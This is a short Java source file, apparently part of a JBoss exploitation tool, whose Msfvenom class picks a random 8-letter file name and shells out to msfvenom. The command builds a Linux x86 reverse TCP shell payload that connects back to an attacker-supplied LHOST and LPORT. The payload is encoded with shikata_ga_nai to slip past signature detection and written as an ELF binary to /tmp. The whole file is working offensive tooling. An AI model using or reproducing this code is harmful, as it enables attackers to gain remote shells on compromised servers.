package jbossexploit;


import java.util.Random;

public class Msfvenom {

    public static String generateBinaryName() {
        Random rng = new Random();
        char[] text = new char[8];
        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        for (int i = 0; i < 8; i++) {
            text[i] = characters.charAt(rng.nextInt(characters.length()));
        }

        return new String(text);
    }

    public static boolean generateBinary(String lhost, int port, String name) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp " +
                "LHOST=" + lhost + " LPORT=" + port + " -b '\\x00' -e x86/shikata_ga_nai -f elf -o /tmp/" + name);
            p.waitFor();
            System.out.println("Binary created!");
            return true;
        } catch (Exception e) {
            System.out.println("Error creating binary.");
            return false;
        }
    }
}
